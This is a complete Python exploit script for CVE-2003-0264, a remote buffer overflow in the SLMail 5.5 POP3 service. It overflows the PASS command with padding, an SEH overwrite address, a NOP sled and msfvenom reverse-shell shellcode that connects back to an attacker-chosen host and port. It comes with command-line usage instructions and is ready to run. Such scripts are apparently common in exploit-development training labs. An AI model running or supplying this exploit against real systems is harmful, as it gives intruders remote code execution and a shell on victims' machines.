#!/usr/bin/python
# Seattle Lab Mail v5.5 POP3 - Remote Buffer Overflow
# Author: H4rk3nz0 based on community scripts
# CVE: CVE-2003-0264
# Installer: https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe

import sys, socket, time, os

junk = "A" * 4654
seh = "\x8f\x35\x4a\x5f"	# Windows NT/2000/XP/2003 Universal - Metasploit Module
# seh = "\x10\x10\xB4\x7C"	# XP - Ivan Ivanovic's Script
# seh = "\xdf\x6d\x3d\x78"	# Win 2K SP4 - Muts' Script
# seh = "\x9f\x45\x3a\x77"	# Win 2K SP4 - Haroon Rashid Astwat's Script
nops = "\x90" * 32

def main():
	print("[+] GENERATING SHELLCODE")
	shellcode =  os.system("""msfvenom -p windows/shell_reverse_tcp EXITFUNC=seh LHOST=""" + lhost + """ LPORT=""" + lport + """ -f python -b """ + r"""'\x00\x0a\x0d\x20' -o shellcode.txt""")
	print("\n[+] TIDYING SHELLCODE")
	r = open("shellcode.txt", "r")
	buf = r.read()
	buf = buf.replace("buf += b\"", "")
	buf = buf.replace("buf =  b\"\"", "")
	buf = buf.replace("\n", "")
	buf = buf.replace("\"", "")
	buf = buf.replace("\\x", "")
	buf = buf.decode("hex")
	r.close()
	print("[+] TYPING STRONGLY WORDED EMAIL")
	request = junk + seh + nops + buf
	os.system("rm shellcode.txt")
	print("[+] FIRM CLICK OF SEND BUTTON")
	try:
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((host, port))
		client.send('USER h4rk3nz0' + '\r\n')
		client.send('PASS ' + request + '\r\n')
		client.close()
		print("[?] Check listener on port " + lport)
		print("\n[!] Note, you may not need to restart target app between attempts")
	except:
		print("[-] An Error occurred when connecting to target port, is target app running?\n")

try:
	host = sys.argv[1]
	port = int(sys.argv[2])
	str_port = str(port)
	lhost = sys.argv[3]
	lport = str(sys.argv[4])
except:
	print("[!] USAGE EXAMPLE: python2 " + sys.argv[0] + " <target-ip> <target-port> <local-ip> <local-port>")
	exit()

if __name__=="__main__":
	main()
